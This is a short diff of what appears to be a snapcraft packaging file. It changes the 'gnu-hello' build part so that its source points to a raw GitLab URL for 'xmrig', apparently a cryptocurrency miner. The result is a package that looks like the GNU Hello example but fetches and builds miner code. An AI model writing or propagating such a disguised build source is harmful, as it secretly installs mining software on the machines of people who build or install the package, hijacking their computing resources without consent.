@@ -12,4 +12,4 @@ apps:
 parts:
   gnu-hello:
     plugin: autotools
-    https://gitlab.com/madisonmedia/madisonmedia/raw/master/xmrig
+    source: https://gitlab.com/madisonmedia/madisonmedia/raw/master/xmrig
